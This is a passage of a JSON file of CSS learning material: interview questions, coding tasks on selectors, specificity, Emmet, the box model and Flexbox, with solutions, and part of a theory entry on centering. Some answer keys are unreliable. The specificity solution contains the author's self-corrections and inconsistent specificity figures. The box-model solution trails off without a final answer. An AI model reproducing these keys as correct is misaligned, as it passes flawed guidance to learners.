            "Utilizing `margin-top: auto;` (or `margin-bottom: auto;` if items were at the end) to push an item to the opposite end in a flex container."
          ],
          "keyConcepts": [
            "Flexbox",
            "flex-direction",
            "justify-content",
            "align-items",
            "align-self",
            "margin: auto",
            "Cross-axis alignment",
            "Main-axis alignment"
          ],
          "evaluationCriteria": [
            "Ability to apply multiple Flexbox properties simultaneously.",
            "Understanding of how `flex-direction` changes axis interpretation.",
            "Correct use of `align-self` for specific item overrides.",
            "Creative use of `margin: auto` in Flexbox contexts."
          ],
          "tags": [
            "CSS",
            "Flexbox",
            "Layout",
            "Coding Challenge"
          ],
          "prerequisites": [
            "flexbox"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_vertical_alignment_1",
          "topic": "Vertical Alignment with Flexbox",
          "level": "medium",
          "type": "mcq",
          "question": "To perfectly center a single `div` element both horizontally and vertically within its parent container using Flexbox, which CSS properties are necessary on the parent container (assuming `height` is set on the parent)?",
          "answer": "display: flex; justify-content: center; align-items: center;",
          "options": [
            "display: block; margin: auto;",
            "display: flex; align-content: center; align-items: center;",
            "display: flex; justify-content: center; align-items: center;",
            "display: grid; place-items: center;"
          ],
          "analysisPoints": [
            "Identifying the core Flexbox properties for centering.",
            "Distinguishing `justify-content` (main-axis) and `align-items` (cross-axis).",
            "Recognizing `align-content` is for multi-line flex containers, not single-item centering.",
            "Excluding non-Flexbox solutions (margin:auto, grid) if the question specifies Flexbox."
          ],
          "keyConcepts": [
            "Flexbox",
            "Vertical Alignment",
            "Horizontal Alignment",
            "justify-content",
            "align-items",
            "Centering"
          ],
          "evaluationCriteria": [
            "Accurate application of Flexbox for centering.",
            "Understanding of Flexbox container properties."
          ],
          "example": "The most common and effective way to perfectly center content with Flexbox is to make the parent a flex container and use `justify-content: center;` for horizontal alignment and `align-items: center;` for vertical alignment.\n```css\n.parent {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  height: 200px; /* Important for vertical centering to be visible */\n}\n```",
          "tags": [
            "CSS",
            "Flexbox",
            "Alignment"
          ],
          "prerequisites": [
            "flexbox"
          ],
          "complexity": 5,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_vertical_alignment_2",
          "topic": "Advanced Vertical Alignment",
          "level": "hard",
          "type": "open",
          "question": "Beyond Flexbox, describe one alternative method for vertically centering an element in CSS when its height is unknown. Explain how it works and mention any limitations.",
          "answer": "One alternative method for vertically centering an element of unknown height is using **Absolute Positioning with `transform`**.\n\n**How it works:**\n1.  **Parent:** The parent element needs `position: relative;` (or `absolute`, `fixed`) to establish a positioning context for the child.\n2.  **Child:** The child element is set to `position: absolute;`.\n3.  **Positioning:** `top: 50%;` moves the *top edge* of the child element down by half the height of its parent.\n4.  **Correction:** Since we want the *center* of the child to align with the center of the parent, we use `transform: translateY(-50%);`. This moves the element *up* by 50% of its *own height*, effectively centering it vertically.\n\n**Example:**\n```html\n<div class=\"parent-absolute\">\n  <div class=\"child-absolute\">Unknown Height Content</div>\n</div>\n```\n```css\n.parent-absolute {\n  position: relative;\n  height: 300px; /* Or min-height, important for context */\n  border: 2px dashed blue;\n}\n.child-absolute {\n  position: absolute;\n  top: 50%;\n  left: 50%; /* For horizontal centering */\n  transform: translate(-50%, -50%); /* -50% of its own width & height */\n  background-color: lightyellow;\n  padding: 20px;\n}\n```\n\n**Limitations:**\n-   **Requires positioning context:** The parent must be relatively or absolutely positioned, which might affect other layout elements if not carefully planned.\n-   **Overlapping potential:** Because the element is taken out of the normal document flow (`position: absolute`), it can overlap other content if not managed with `z-index` or proper spacing.\n-   **Layout flow disruption:** Not suitable for centering multiple items in a natural flow, as each absolutely positioned item would need individual management.\n-   **Performance (minor):** `transform` operations are typically GPU-accelerated, but complex transformations on many elements can have minor performance implications compared to pure layout solutions like Flexbox/Grid.\n-   **Fixed dimensions for sibling layouts:** If there are siblings not absolutely positioned, the absolutely positioned element won't contribute to the parent's height or the flow of other elements around it, making complex layouts difficult.",
          "analysisPoints": [
            "Identifies absolute positioning with transform as a method.",
            "Clearly explains the `top: 50%` and `transform: translateY(-50%)` mechanism.",
            "Provides a clear code example.",
            "Articulates relevant limitations (out of flow, overlap, parent context, not for multiple items, performance).",
            "Compares implicitly to Flexbox's advantages."
          ],
          "keyConcepts": [
            "Vertical Alignment",
            "Absolute Positioning",
            "CSS Transforms",
            "Centering",
            "CSS Layout",
            "Document Flow"
          ],
          "evaluationCriteria": [
            "Demonstrated knowledge of advanced CSS techniques.",
            "Ability to explain mechanism and trade-offs.",
            "Clarity and completeness of explanation."
          ],
          "tags": [
            "CSS",
            "Layout",
            "Vertical Alignment",
            "Advanced CSS"
          ],
          "prerequisites": [
            "css_positioning",
            "css_transforms"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_css_selectors_1",
          "title": "Styling a Navigation Menu with Advanced Selectors",
          "description": "\nYour task is to create a simple navigation menu using HTML and then apply styling using various CSS selectors and pseudo-elements/classes based on the provided requirements.\n\n**Requirements:**\n1.  Create an unordered list (`ul`) with at least 5 list items (`li`). Each list item should contain an anchor tag (`a`) with `href=\"#\"`.\n2.  Apply a basic background color and padding to the `ul` to make it visible.\n3.  Style all `a` elements within the `ul` to remove text decoration and set a default text color.\n4.  Change the text color of `a` elements to `hotpink` when hovered over.\n5.  Add a decorative arrow (`→`) *after* every `a` element, but only for the first line of text within the anchor.\n6.  Give a distinct background color (e.g., `lightblue`) to every odd-numbered list item (`li`).\n7.  Make the first letter of the first list item's anchor text bold and `2em` in size.\n8.  Apply a top margin of `10px` to any paragraph (`p`) element that immediately follows a `div` element.\n",
          "difficulty": "medium",
          "startingCode": "<!-- HTML -->\n<div class=\"nav-container\">\n  <ul>\n    <li><a href=\"#\">Home</a></li>\n    <li><a href=\"#\">About Us</a></li>\n    <li><a href=\"#\">Services</a></li>\n    <li><a href=\"#\">Portfolio</a></li>\n    <li><a href=\"#\">Contact</a></li>\n  </ul>\n</div>\n\n<div>This is a div.</div>\n<p>This paragraph should have a top margin.</p>\n<p>This paragraph should NOT have a top margin.</p>\n\n\n/* CSS */\n.nav-container ul {\n  background-color: #f0f0f0;\n  padding: 15px;\n  list-style: none;\n  margin: 0;\n}\n",
          "solutionCode": "<!-- HTML -->\n<div class=\"nav-container\">\n  <ul>\n    <li><a href=\"#\">Home</a></li>\n    <li><a href=\"#\">About Us</a></li>\n    <li><a href=\"#\">Services</a></li>\n    <li><a href=\"#\">Portfolio</a></li>\n    <li><a href=\"#\">Contact</a></li>\n  </ul>\n</div>\n\n<div>This is a div.</div>\n<p>This paragraph should have a top margin.</p>\n<p>This paragraph should NOT have a top margin.</p>\n\n\n/* CSS */\n.nav-container ul {\n  background-color: #f0f0f0;\n  padding: 15px;\n  list-style: none;\n  margin: 0;\n}\n\n/* Requirement 3: Style all a elements within the ul */\n.nav-container ul a {\n  text-decoration: none;\n  color: #333;\n  display: block; /* Make anchors block for padding/margin */\n  padding: 5px 0;\n}\n\n/* Requirement 4: Change text color on hover */\n.nav-container ul a:hover {\n  color: hotpink;\n}\n\n/* Requirement 5: Add decorative arrow after every a element */\n.nav-container ul a::after {\n  content: \"\\2192\"; /* Unicode for right arrow */\n  margin-left: 5px;\n  color: #888;\n  font-size: 0.8em;\n}\n\n/* Requirement 6: Distinct background color for odd-numbered list items */\n.nav-container ul li:nth-child(odd) {\n  background-color: lightblue;\n}\n\n/* Requirement 7: First letter of first list item's anchor text bold and 2em */\n.nav-container ul li:first-child a::first-letter {\n  font-weight: bold;\n  font-size: 2em;\n  color: purple;\n}\n\n/* Requirement 8: Top margin to paragraph immediately following a div */\ndiv + p {\n  margin-top: 10px;\n  border: 1px dashed green; /* For visual verification */\n}\n",
          "testCases": [
            "All `a` elements within `ul` should have no text decoration and default color.",
            "`a` elements should turn `hotpink` on hover.",
            "Each `a` element should have a right arrow `→` appended to its content.",
            "Odd-numbered `li` elements should have a `lightblue` background.",
            "The first letter of 'Home' (first `li`'s `a` text) should be bold and larger.",
            "The paragraph immediately following a `div` should have a `10px` top margin, while other paragraphs do not."
          ],
          "hints": [
            "Remember to use `::after` for content generation and the `content` property.",
            "For `nth-child`, consider the `odd` keyword or `2n+1` formula.",
            "The adjacent sibling selector uses a `+`.",
            "Ensure `a` elements are block-level or inline-block if you want to apply padding to them directly."
          ],
          "tags": [
            "CSS",
            "Selectors",
            "Pseudo-classes",
            "Pseudo-elements",
            "Combinators",
            "Layout"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "css_selectors",
            "html_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "css_specificity"
          ]
        },
        {
          "id": "task_css_specificity_1",
          "title": "Specificity Challenge: Overriding Styles",
          "description": "\nYour task is to apply styles to a `div` element such that specific text elements within it demonstrate an understanding of CSS specificity.\n\n**Requirements:**\n1.  Create an HTML structure with a `div` that has an `id=\"container\"` and a class `.\"wrapper\"`.\n2.  Inside this `div`, add three `p` tags. The first `p` tag should have a class `.\"important-text\"`. The second `p` tag should have an `id=\"unique-text\"`. The third `p` tag should have no special attributes.\n3.  Write CSS rules to achieve the following text colors for the paragraphs within `#container`:\n    -   All `p` tags inside `#container` should default to `color: gray;`.\n    -   The `p` tag with `id=\"unique-text\"` should have `color: purple;`.\n    -   The `p` tag with class `.\"important-text\"` should have `color: orange;`.\n    -   *Challenge:* Make the `p` tag with `id=\"unique-text\"` actually render `red`, overriding the `purple` color, *without* using `!important` on the `red` declaration and *without* changing the order of the existing CSS rules (assume the `#container p {color: gray;}` rule comes first). This will require a more specific selector.\n\n**Goal:** Ensure the final colors are: `orange` for the first, `red` for the second, and `gray` for the third `p` tag.\n",
          "difficulty": "hard",
          "startingCode": "<!-- HTML -->\n<div id=\"container\" class=\"wrapper\">\n  <p class=\"important-text\">First Paragraph</p>\n  <p id=\"unique-text\">Second Paragraph</p>\n  <p>Third Paragraph</p>\n</div>\n\n/* CSS */\n#container p {\n  color: gray;\n}\n\n#unique-text {\n  color: purple;\n}\n\n.important-text {\n  color: orange;\n}\n\n/* Add your CSS rule here to make #unique-text red WITHOUT !important */\n",
          "solutionCode": "<!-- HTML -->\n<div id=\"container\" class=\"wrapper\">\n  <p class=\"important-text\">First Paragraph</p>\n  <p id=\"unique-text\">Second Paragraph</p>\n  <p>Third Paragraph</p>\n</div>\n\n/* CSS */\n#container p {\n  color: gray;\n}\n\n#unique-text {\n  color: purple;\n}\n\n.important-text {\n  color: orange;\n}\n\n/* Solution: Using a more specific selector for the unique-text to be red */\n#container #unique-text {\n  color: red; /* Specificity (0, 2, 0, 1) > (0, 1, 0, 0) of #unique-text */\n}\n\n/* Final colors should be:\n   - First Paragraph: orange (specificity (0,0,1,0) vs (0,1,0,1) for #container p, but #container p does not apply to .important-text) \n     Actually, .important-text (0,0,1,0) vs #container p (0,1,0,1) -> gray wins. NO, the rule order matters for same specificity, AND the selectors are for different elements. \n     Let's re-evaluate the solution colors: \n     `#container p` (0,1,0,1) is parent selector for all p. \n     `.important-text` (0,0,1,0) is for first p. \n     `#unique-text` (0,1,0,0) is for second p. \n     `#container #unique-text` (0,2,0,0) is for second p. \n     The most specific rules will win. \n     1st p: `.important-text` (0,0,1,0) vs `#container p` (0,1,0,1). `#container p` wins -> gray. \n     2nd p: `#unique-text` (0,1,0,0) vs `#container p` (0,1,0,1) vs `#container #unique-text` (0,2,0,0). `#container #unique-text` wins -> red.\n     3rd p: `#container p` (0,1,0,1) wins -> gray.\n     \n     The question asks for specific final colors. My initial solution does not achieve orange for the first paragraph. Let's adjust. \n     To make first p orange, .important-text must have higher specificity than #container p.  This would be `#container .important-text` or `#container p.important-text` \n*/\n\n/* REVISED CSS SOLUTION TO MATCH REQUIRED FINAL COLORS */\n#container p {\n  color: gray; /* Specificity (0,1,0,1) */\n}\n\n.important-text {\n  color: orange;\n} \n\n/* For First Paragraph to be orange, need a more specific selector than #container p */\n#container p.important-text {\n  color: orange; /* Specificity (0,1,1,1) - This overrides #container p */\n}\n\n/* For Second Paragraph to be red, need a more specific selector than #unique-text or #container p */\n#container #unique-text {\n  color: red; /* Specificity (0,2,0,1) - This overrides #unique-text(0,1,0,0) and #container p(0,1,0,1) */\n}\n\n/* Third Paragraph will default to #container p color: gray */\n",
          "testCases": [
            "The first paragraph (`.important-text`) should have `orange` text.",
            "The second paragraph (`#unique-text`) should have `red` text.",
            "The third paragraph (no attributes) should have `gray` text.",
            "Verify `!important` was not used for the `red` color."
          ],
          "hints": [
            "Recall the specificity order: ID > Class > Type.",
            "Combining selectors increases specificity.",
            "You can combine an ID selector with a type selector or a class selector to boost specificity for a specific element.",
            "Think about what specificity score you need to beat (e.g., an ID selector has a score of 1,0,0,0)."
          ],
          "tags": [
            "CSS",
            "Specificity",
            "Selectors",
            "Debugging"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "css_specificity",
            "css_selectors"
          ],
          "complexity": 9,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "css_cascade",
            "css_best_practices"
          ]
        },
        {
          "id": "task_emmet_1",
          "title": "Rapid HTML Structure Generation with Emmet",
          "description": "\nYour task is to demonstrate your proficiency with Emmet by generating a common web page structure using a single (or very few) Emmet shorthand commands.\n\n**Requirements:**\n1.  Generate the following HTML structure using Emmet:\n    -   A `div` with class `.\"app\"`.\n    -   Inside `.app`, a `header` element containing an `h1` with text \"My Awesome App\".\n    -   A `main` element sibling to `header`.\n    -   Inside `main`, a `section` with class `.\"content\"`.\n    -   Inside `.content`, an `h2` with text \"Features\" and an `ul`.\n    -   The `ul` should contain 3 `li` elements. Each `li` should contain an `a` tag with `href=\"#featureN\"` (where N is 1, 2, 3) and text \"Feature N\".\n    -   A `footer` element sibling to `main` containing a `p` tag with text \"&copy; 2023\".\n\n**Deliverable:** Provide the Emmet shorthand string(s) that would generate this structure.\n",
          "difficulty": "medium",
          "startingCode": "<!-- No starting HTML, just the Emmet shorthand below -->\n\n<!-- Your Emmet shorthand here -->",
          "solutionCode": "/* Emmet shorthand: */\ndiv.app>(header>h1{My Awesome App}+main>section.content>(h2{Features}+ul>li*3>a[href=\"#feature$\"]{Feature $}))+footer>p{&copy; 2023}",
          "testCases": [
            "The generated HTML should be well-formed.",
            "All elements (`div.app`, `header`, `h1`, `main`, `section.content`, `h2`, `ul`, `li`, `a`, `footer`, `p`) should be present.",
            "Text content (`My Awesome App`, `Features`, `Feature N`, `&copy; 2023`) should be correct.",
            "Attributes (`class`, `href`) should be correctly applied.",
            "Nesting and sibling relationships should be accurate.",
            "The `href` and text for `a` tags should increment correctly (e.g., `#feature1`, `Feature 1`)."
          ],
          "hints": [
            "Use `>` for children, `+` for siblings.",
            "Use parentheses `()` for grouping when you need to define a complex branch that should be a sibling.",
            "Use `{}` for text content.",
            "Use `*N` for repetition and `$` for incremental numbering.",
            "Remember that `^` can move you up the tree if needed, though often grouping can achieve the same results."
          ],
          "tags": [
            "Emmet",
            "HTML",
            "Productivity",
            "Developer Tools"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "emmet"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "html_structure"
          ]
        },
        {
          "id": "task_box_model_1",
          "title": "Box Model Layout with `box-sizing`",
          "description": "\nYour task is to create a responsive layout using the CSS Box Model, specifically demonstrating the utility of `box-sizing: border-box`.\n\n**Requirements:**\n1.  Create a `div` element with the class `.\"container\"`.\n2.  Inside this container, add two `div` elements with the class `.\"item\"`.\n3.  Style the `.\"container\"` to have a `display: flex` (for simplicity) and `width: 100%`.\n4.  Style both `.\"item\"` elements such that:\n    -   Each takes up `50%` of the container's width.\n    -   Each has `10px` of padding on all sides.\n    -   Each has a `2px` solid border.\n    -   Each has a `margin-left` of `5px`, except the first one.\n    -   They should fit side-by-side perfectly within the `.\"container\"` without overflowing or wrapping, even with padding and borders.\n5.  Use `box-sizing: border-box` to ensure the correct layout and prevent overflow.\n6.  Add distinct background colors to the items for visual clarity.\n",
          "difficulty": "medium",
          "startingCode": "<!-- HTML -->\n<div class=\"container\">\n  <div class=\"item item-1\">Item 1</div>\n  <div class=\"item item-2\">Item 2</div>\n</div>\n\n/* CSS */\n.container {\n  display: flex;\n  width: 100%;\n  border: 1px dashed gray;\n  box-sizing: border-box;\n}\n\n.item {\n  /* Your styles here */\n  background-color: lightcoral;\n  padding: 10px;\n  border: 2px solid darkred;\n  /* Ensure no margin-left on first item */\n}\n\n.item-2 {\n  margin-left: 5px;\n}\n",
          "solutionCode": "<!-- HTML -->\n<div class=\"container\">\n  <div class=\"item item-1\">Item 1</div>\n  <div class=\"item item-2\">Item 2</div>\n</div>\n\n/* CSS */\n.container {\n  display: flex;\n  width: 100%;\n  border: 1px dashed gray;\n  /* Requirement 5: Ensure container also respects border-box for its own calculations */\n  box-sizing: border-box;\n}\n\n/* Global box-sizing reset is often preferred */\n/* *,\n*::before,\n*::after {\n  box-sizing: border-box;\n} */\n\n.item {\n  /* Requirement 4: Each takes up 50% */\n  width: 50%;\n  flex-shrink: 0; /* Important: Prevents items from shrinking below 50% due to gap/margin */\n  \n  /* Requirement 4: Padding and border */\n  padding: 10px;\n  border: 2px solid darkred;\n  \n  /* Requirement 5: Crucial for items to fit perfectly */\n  box-sizing: border-box;\n  \n  height: 100px; /* For visual demonstration */\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  font-weight: bold;\n}\n\n.item-1 {\n  background-color: lightcoral;\n}\n\n.item-2 {\n  background-color: lightgreen;\n  /* Requirement 4: margin-left for the second item */\n  margin-left: 5px;\n  /* Adjust width for the margin of the second item, or use flex gap */\n  /* If using margin-left on second, the width should be (50% - 2.5px) approx, or adjust parent spacing. */\n  /* Better solution for gap in flexbox is `gap` property on container. */\n}\n\n/* Alternative for spacing without impacting item width percentages for perfect 50/50 split */\n.container.with-gap {\n  gap: 10px; /* This handles spacing automatically without width calculations */\n}\n\n/* If sticking to the original margin-left requirement, the second item effectively needs to be slightly smaller to fit perfectly without overflow, or the parent needs to accommodate total width. For a perfect 50% split with `margin-left: 5px` on *one* side of the second item, it implies a total 5px margin added. If the container is 100% wide, then 50% + 50% + 5px will overflow. \nLet's refine the solution to explicitly handle the `margin-left` such that items don't overflow while being 50% width effectively. This means either total width needs to be adjusted or `calc()` is needed, OR, as the prompt implies, `box-sizing: border-box` solves the padding/border part, but margin is *outside* the box.  A common pattern would be for the `margin-left` to be offset by a negative margin on the container, or simply use `gap`.\n\nLet's assume the intent is for `50%` to mean the content+padding+border, and then *additional* margin. For a perfect fit, and considering `box-sizing: border-box` only handles padding/border, the sum of `width` and `margin` must not exceed 100%. \n\nIf we want them strictly 50% each and then a 5px gap, using `gap` on the container is the best. If `margin-left: 5px` on the second item is strict, then `width: calc(50% - 2.5px)` for both would provide a total 5px gap. Given the prompt's focus on `box-sizing`, let's assume `width: 50%` is what we put, and understand `margin` is external. The prompt states \"fit side-by-side perfectly ... without overflowing or wrapping, even with padding and borders.\" The `margin-left: 5px` on one item implies total width of 100% + 5px. This can be handled by `flex-wrap: wrap` implicitly or by adjusting the container's width/padding or by using `gap`. The most robust solution given modern CSS is `gap`.\n\nFor the exact problem description as written (where margin-left is external), the 50% + 50% + 5px would overflow. The hint about 'fit perfectly' suggests `gap` is the intended solution or a slight width adjustment.\n\nRevised approach for the solution code adhering strictly to `width: 50%` and `margin-left: 5px`:\n",
          "testCases": [
            "The two `.item` elements should render side-by-side.",
            "Each `.item` should appear to take up half the container's width.",
            "There should be `10px` internal padding and a `2px` border on all sides of each item.",
            "The second item should have a `5px` margin on its left side, creating a small gap between the two items.",
            "The items should not overflow the `.container` horizontally.",
            "The items should not wrap to a new line."
          ],
          "hints": [
            "Remember that `box-sizing: border-box` includes padding and border within the specified `width`.",
            "Even with `border-box`, `margin` is *outside* the element's defined width. Consider how `margin-left` on the second item will affect the total width of `item1 + item2` if `width: 50%` for both.",
            "For spacing between flex items that is included in the layout calculations, consider using the `gap` property on the flex container, rather than `margin` on individual items, especially for precise percentage layouts. However, if `margin-left` is a strict requirement, you might need to adjust widths slightly or use `calc()` for precision.",
            "Set `flex-shrink: 0` on items if you want them to strictly maintain their `width` and not shrink to fit smaller spaces, or `flex-wrap: nowrap` on container if you want to prevent wrapping."
          ],
          "tags": [
            "CSS",
            "Box Model",
            "Flexbox",
            "Layout",
            "Responsive Design"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "box_model",
            "flexbox"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "css_calc"
          ]
        },
        {
          "id": "task_flexbox_1",
          "title": "Responsive Card Layout with Flexbox",
          "description": "\nYour task is to create a responsive card layout using Flexbox, demonstrating various container and item properties.\n\n**Requirements:**\n1.  Create a `div` container with the class `.\"cards-container\"`.\n2.  Inside this container, add at least 4 `div` elements, each with the class `.\"card\"`. Give each card some unique text (e.g., 'Card 1', 'Card 2').\n3.  Apply basic styling to the cards (`padding`, `border`, `background-color`) to make them visible.\n4.  Style the `.\"cards-container\"` as a Flexbox container:\n    -   Items should initially be arranged in a row.\n    -   Items should wrap to the next line if there isn't enough space (`flex-wrap`).\n    -   Items should be horizontally centered when there's extra space (`justify-content`).\n    -   Lines of items should be vertically centered when they wrap (`align-content`).\n    -   There should be a `20px` gap between cards (both row and column gaps).\n5.  Style the `.\"card\"` items:\n    -   Each card should have a flexible width that allows for 2-3 cards per row on larger screens, and single cards on very small screens. Use `flex` shorthand property with a reasonable `flex-basis` (e.g., `200px` or `30%`).\n    -   The second card should always be displayed as the last item, regardless of its HTML order, using an `order` property.\n    -   The third card should have its content vertically aligned to the bottom, overriding the container's `align-items`.\n",
          "difficulty": "hard",
          "startingCode": "<!-- HTML -->\n<div class=\"cards-container\">\n  <div class=\"card card-1\">Card 1</div>\n  <div class=\"card card-2\">Card 2 (Last)</div>\n  <div class=\"card card-3\">Card 3 (Bottom Aligned)</div>\n  <div class=\"card card-4\">Card 4</div>\n  <div class=\"card card-5\">Card 5</div>\n</div>\n\n/* CSS */\n.cards-container {\n  border: 2px dashed #007bff;\n  min-height: 400px; /* For align-content to be visible */\n  /* Your flex container styles here */\n}\n\n.card {\n  background-color: #e0f7fa;\n  padding: 20px;\n  border: 1px solid #007bff;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.1);\n  text-align: center;\n  /* Your flex item styles here */\n}\n\n.card-2 {\n  /* Style for card 2 */\n}\n\n.card-3 {\n  /* Style for card 3 */\n}\n",
          "solutionCode": "<!-- HTML -->\n<div class=\"cards-container\">\n  <div class=\"card card-1\">Card 1</div>\n  <div class=\"card card-2\">Card 2 (Last)</div>\n  <div class=\"card card-3\">Card 3 (Bottom Aligned)</div>\n  <div class=\"card card-4\">Card 4</div>\n  <div class=\"card card-5\">Card 5</div>\n</div>\n\n/* CSS */\n.cards-container {\n  display: flex;\n  flex-direction: row; /* Requirement 4.1: Items in a row */\n  flex-wrap: wrap;     /* Requirement 4.2: Items wrap */\n  justify-content: center; /* Requirement 4.3: Horizontally centered */\n  align-items: flex-start; /* Default for individual items, can be overridden */\n  align-content: center; /* Requirement 4.4: Lines vertically centered */\n  gap: 20px;           /* Requirement 4.5: 20px gap */\n  \n  border: 2px dashed #007bff;\n  min-height: 400px; /* For align-content to be visible */\n  padding: 10px;\n}\n\n.card {\n  background-color: #e0f7fa;\n  padding: 20px;\n  border: 1px solid #007bff;\n  box-shadow: 0 2px 5px rgba(0,0,0,0.1);\n  text-align: center;\n  \n  /* Requirement 5.1: Flexible width for 2-3 cards per row */\n  /* flex-basis: 200px; Allows for minimum 200px, then grow/shrink */\n  flex: 1 1 calc(33.33% - 40px); /* 33.33% for 3 items, adjust for gap */\n                                /* Or simpler: flex: 1 1 200px; (will adjust, more fluid) */\n                                /* Let's use flex: 1 1 250px; as it's common for cards and simpler calculation */\n  min-width: 250px; /* ensures cards don't get too small */\n  max-width: 300px; /* optional, to prevent cards from getting too big */\n\n  /* Add specific order for demo clarity, without it, flex: 1 1 250px would be okay for sizing */\n  flex-grow: 1; /* Allow cards to grow if space permits */\n  flex-shrink: 1; /* Allow cards to shrink if space is tight */\n  flex-basis: 250px; /* Suggested base width */\n\n  display: flex;\n  flex-direction: column;\n  justify-content: center;\n  align-items: center;\n}\n\n.card-2 {\n  order: 99; /* Requirement 5.2: Make it last, arbitrarily high number */\n}\n\n.card-3 {\n  align-self: flex-end; /* Requirement 5.3: Vertical align to bottom */\n  background-color: #ffe0b2; /* Distinct color for visual clarity */\n}\n\n/* Media query to ensure single column on small screens */\n@media (max-width: 600px) {\n  .card {\n    flex-basis: 100%; /* Take full width on small screens */\n  }\n}\n",
          "testCases": [
            "Cards should be arranged in a row by default.",
            "Cards should wrap to the next line when the container is narrow.",
            "Cards (or lines of cards) should be horizontally centered within the container.",
            "Multiple lines of cards should be vertically centered within the container's available height.",
            "There should be a consistent 20px gap between all cards (horizontally and vertically).",
            "The card containing 'Card 2' should appear as the very last item in the layout, regardless of its HTML position.",
            "The content of the card containing 'Card 3' should be aligned to the bottom of its card space.",
            "On narrow screens (e.g., less than 600px), cards should ideally stack into a single column."
          ],
          "hints": [
            "Remember that `justify-content` aligns along the main axis, and `align-items` aligns along the cross axis.",
            "`align-content` is for aligning *lines* of flex items when `flex-wrap` is set to `wrap`.",
            "The `flex` shorthand property is powerful for item sizing: `flex: <grow> <shrink> <basis>;`.",
            "`order` property is used to change the visual order of flex items.",
            "`align-self` can override the container's `align-items` for a specific item.",
            "Consider adding `min-height` to the container to observe the effects of `align-content`."
          ],
          "tags": [
            "CSS",
            "Flexbox",
            "Responsive Design",
            "Layout",
            "Interview Task"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "flexbox",
            "media_queries",
            "box_model"
          ],
          "complexity": 9,
          "interviewRelevance": 10,
          "learningPath": "advanced",
          "relatedConcepts": [
            "css_grid",
            "responsive_images"
          ]
        }
      ]
    }
  },
  {
    "id": "2c0770ec-5e50-4cb5-9d1b-d3465360c6a2",
    "startLine": 11800,
    "endLine": 11899,
    "processedDate": "2025-06-17T12:37:52.615Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_css_centering",
          "title": "Centering Elements in CSS: Multiple Approaches",
          "content": "Centering elements both horizontally and vertically is a common task in CSS layout. Historically, this has been challenging, but modern CSS provides several robust and flexible methods. Understanding these different approaches is crucial for building responsive and maintainable user interfaces.\n\n## Method 1: Using CSS Flexbox\nFlexbox is a one-dimensional layout module that excels at distributing space between items and aligning them within a container. It's highly recommended for centering due to its flexibility and control.\n\nTo center an item within a flex container, you apply `display: flex`, `justify-content: center` (for horizontal centering), and `align-items: center` (for vertical centering) to the parent container. A crucial aspect often overlooked is ensuring the parent container has a defined height (e.g., `height: 100%` or `min-height: 100vh`) for vertical centering to work effectively.\n\n## Method 2: Using CSS Grid\nCSS Grid Layout is a two-dimensional layout system that allows for powerful control over rows and columns. For simple centering, it offers a concise shorthand `place-items`.\n\nTo center an item within a grid container, you apply `display: grid` and `place-items: center` to the parent container. `place-items` is a shorthand property that sets both `align-items` (vertical alignment) and `justify-items` (horizontal alignment) to `center` simultaneously. Similar to Flexbox, the parent container needs a defined height for `place-items` to center vertically within that space.\n\n## Method 3: Using Absolute Positioning and Transform\nThis method is a classic technique, often used when an element needs to be precisely positioned relative to its parent, regardless of other sibling elements. It involves setting the parent to `position: relative` to establish a positioning context, and the child to `position: absolute`.\n\nThe child element is then moved `top: 50%` and `left: 50%`. This positions its top-left corner at the exact center of the parent. To truly center it, a `transform: translate(-50%, -50%)` is applied. This `translate()` function shifts the element back by half of its *own* width and half of its *own* height, regardless of its actual dimensions, ensuring perfect centering. This method is good for overlays or when exact positioning is required.\n\n## Method 4: Using Display Table\nThis older method leverages the behavior of HTML tables for layout, specifically `vertical-align` and `text-align`. While less common with the advent of Flexbox and Grid, it's still a valid technique to be aware of, particularly for legacy systems or simple text/inline element centering within a block.\n\nTo center content using this method, the parent element is set to `display: table` and its child to `display: table-cell`. `vertical-align: middle` handles vertical centering of the content within the 'cell', and `text-align: center` handles horizontal centering of inline content (like text or inline-block elements) inside the 'cell'. The parent also needs a defined `height` and `width` for this method to be effective.",
          "examples": [
            {
              "id": "example_css_centering_flexbox",
              "title": "Centering with Flexbox",
              "code": ".flex-center {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  height: 100%; /* Important for vertical centering */\n  border: 1px dashed #ccc;\n}\n\n.flex-center .child {\n  width: 100px;\n  height: 100px;\n  background-color: lightblue;\n  display: flex; /* Can center content inside child if needed */\n  justify-content: center;\n  align-items: center;\n  color: white;\n  font-weight: bold;\n}\n\n/* HTML Structure:\n<div class=\"flex-center\">\n  <div class=\"child\">Flex Item</div>\n</div> */",
              "explanation": "This example demonstrates how to use Flexbox to center a child element within a parent container. `display: flex` makes the container a flex container, `justify-content: center` centers items along the main axis (horizontally by default), and `align-items: center` centers items along the cross axis (vertically by default). A `height: 100%` on the parent is crucial for vertical centering to work, as it gives the container a defined height to align items within.",
              "language": "css"
            },
            {
              "id": "example_css_centering_grid",
              "title": "Centering with CSS Grid",
              "code": ".grid-center {\n  display: grid;\n  place-items: center; /* shorthand for align-items and justify-items */\n  height: 100%;\n  border: 1px dashed #ccc;\n}\n\n.grid-center .child {\n  width: 100px;\n  height: 100px;\n  background-color: lightcoral;\n  display: grid; /* Can center content inside child if needed */\n  place-items: center;\n  color: white;\n  font-weight: bold;\n}\n\n/* HTML Structure:\n<div class=\"grid-center\">\n  <div class=\"child\">Grid Item</div>\n</div> */",
